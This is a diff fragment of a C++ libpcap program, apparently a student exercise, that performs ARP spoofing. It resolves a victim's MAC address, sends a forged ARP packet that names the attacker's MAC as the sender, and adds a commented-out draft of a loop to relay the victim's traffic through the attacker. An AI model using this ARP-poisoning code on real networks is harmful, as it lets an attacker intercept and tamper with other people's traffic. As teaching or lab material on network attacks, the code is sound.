@@ -77,10 +77,13 @@ int main(int argc, char* argv[]) {
 	char target_mac[20] = {0,};//target_mac
 	struct ip* iph;
 	struct libnet_ethernet_hdr* mac;
+
    //EthHdr -> type()
    struct EthHdr *t;
 
+
    printf("Infecting Victim\n");
+
    while(true){
       int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
       if (res != 0) {
@@ -125,18 +128,21 @@ int main(int argc, char* argv[]) {
 
          iph = (struct ip*)(packet+sizeof(struct libnet_ethernet_hdr) + 2);
          printf("%s\n",inet_ntoa(iph->ip_src));
-         // printf("%s\n",target_mac);
+         printf("%s\n",target_mac);
          if(strcmp(inet_ntoa(iph->ip_src),argv[2]) == 0)
          {
             break;
          }
+
+         // break; // broadcast
       }
 	   
    }
+
    printf("I Found victim's mac!\n");
    printf("Start Attack!\n");
 
-   //attack
+   //victim attack
    packet.eth_.dmac_ = Mac(target_mac); // victim MAC
    packet.eth_.smac_ = Mac(Attacker_Mac); // hacker MAC
    packet.eth_.type_ = htons(EthHdr::Arp);
@@ -157,9 +163,72 @@ int main(int argc, char* argv[]) {
    }else{
       printf("attack success!\n");
    }
+   
+   // int i =0;
 
+   // //victim -> attacker 
+   // while(true){
+   //    struct pcap_pkthdr* header;
+
+   //    const u_char* packet;//packet_data
+
+   //    res = pcap_next_ex(handle, &header, &packet);
+
+   //    if (res == 0) continue;
+
+   //    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+
+   //       printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+
+   //       break;
+
+   //    }
+      
+   //    // printf("ARP test\n");
+   //    t = (EthHdr*)packet;      
+   //    // printf("%x\n",t->type_); //packet type 16
+   //    // printf("%d\n",t->type_); //packet type 10
+
+   //    struct EthArpPacket *p;
+   //    p = (EthArpPacket*)packet;
+   //    ip *ip_packet = (ip*)packet; 
+   //    if(t->type_ == 1544){
+   //       printf("I got arp packet!\n");
+   //    }else if(t->type_ == 8){//ip4 packet
+   //       printf("I got IP packet!\n");
+   //       //attacker -> gateway
+   //       // p->eth_.dmac_ = Mac("90:9f:33:a4:e0:f8"); // victim MAC
+   //       // p->eth_.smac_ = Mac(Attacker_Mac); // hacker MAC
+   //       // p->eth_.type_ = htons(EthHdr::Arp);
+
+   //       // p->arp_.hrd_ = htons(ArpHdr::ETHER);
+   //       // p->arp_.pro_ = htons(EthHdr::Ip4);
+   //       // p->arp_.hln_ = Mac::SIZE;
+   //       // p->arp_.pln_ = Ip::SIZE;
+   //       // p->arp_.op_ = htons(ArpHdr::Request);
+   //       // p->arp_.smac_ = Mac(Attacker_Mac);   // hacker MAC
+   //       // p->arp_.sip_ = htonl(Ip(gateway_ip));   // gateway ip
+   //       // p->arp_.tmac_ = Mac(target_mac);   // victim MAC
+   //       // p->arp_.tip_ = htonl(Ip(victim_ip));   // victim ip
+   //       printf("%#x\n",ip_packet->ip_src.s_addr);
+   //       printf("%#x\n",ip_packet->ip_dst.s_addr);
+         
+         
+
+
+
+   //    }
+	   
+   //    i++;
+   //    if(i==10){
+   //       break;
+   //    }
+      
+
+   // }
 
    
+
 
 
 
